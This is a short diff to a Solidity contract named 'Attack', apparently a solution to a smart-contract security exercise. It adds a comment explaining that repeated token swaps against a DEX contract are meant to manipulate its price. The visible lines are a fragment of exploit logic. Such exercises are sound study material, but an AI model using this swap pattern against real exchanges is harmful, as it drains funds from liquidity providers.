@@ -33,6 +33,7 @@ contract Attack{
         token2.approve(address(dex),110);
 
         // Perform multiple swaps between token1 and token2
+        //so we can manipulate the price
         dex.swap(address(token1),address(token2),token1.balanceOf(address(this)));
         dex.swap(address(token2),address(token1),token2.balanceOf(address(this)));
         dex.swap(address(token1),address(token2),token1.balanceOf(address(this)));
